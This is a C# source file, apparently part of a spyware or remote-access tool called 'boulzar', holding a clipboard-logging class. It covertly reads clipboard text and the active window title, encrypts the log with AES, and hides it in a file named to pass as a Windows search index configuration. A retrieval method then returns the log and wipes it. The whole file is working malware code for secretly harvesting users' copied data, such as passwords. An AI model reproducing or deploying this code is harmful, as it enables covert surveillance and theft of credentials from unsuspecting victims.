using boulzar.Other;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
namespace boulzar.Methods
{
    class Tlipboard
    {
        public static string clipfile = Csettings.install_path + @"\Windows search index.cfg";
        public static string last_clip { get; set; }
        public static string all_clip { get; set; }
        public static string currnt_clip;
        public static string Line = Environment.NewLine;
        public static void clipit()
        {



            Thread staThread = new Thread(
             delegate ()
             {
                 try
                 {
                     currnt_clip = Clipboard.GetText();
                 }

                 catch (Exception ex)
                 {
                     currnt_clip = ex.Message;
                 }
             });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();




            DateTime now = DateTime.Now;



            if (!File.Exists(clipfile))
            {
                var Stream = File.Create(clipfile);
                Stream.Close();

            }


            if (last_clip != currnt_clip)
            {

                File.SetAttributes(clipfile, FileAttributes.Normal);
                string thefile = File.ReadAllText(clipfile);
                if (thefile.Length != 0)
                {
                    thefile = AES.StrDecrypt(thefile);
                }


                last_clip = currnt_clip;
                all_clip += "<tr>";
                all_clip += "<td>" + now.ToString("F") + "</td>" + Line;
                all_clip += "<td>" + Helpers.GetActiveWindowTitle() + "</td>" + Line;
                all_clip += "<td>" + currnt_clip + "</td>" + Line;
                all_clip += "</tr>";
                thefile += all_clip;

                thefile = AES.strEncrypt(thefile);
                StreamWriter strm = new StreamWriter(clipfile);
                strm.Write(thefile);
                strm.Dispose();
                strm.Close();
                File.SetAttributes(clipfile, FileAttributes.Hidden);
                all_clip = string.Empty;



            }

        }

        public static string GetCliped()
        {
            File.SetAttributes(clipfile, FileAttributes.Normal);
            string thefile = File.ReadAllText(clipfile);
            if (thefile.Length != 0)
            {
                thefile = AES.StrDecrypt(thefile);
            }
            else
            {

                return "The File is empty";
            }


            File.Delete(clipfile);
            var Stream = File.Create(clipfile);
            Stream.Close();
            File.SetAttributes(clipfile, FileAttributes.Hidden);
            return thefile;


        }

    }
}
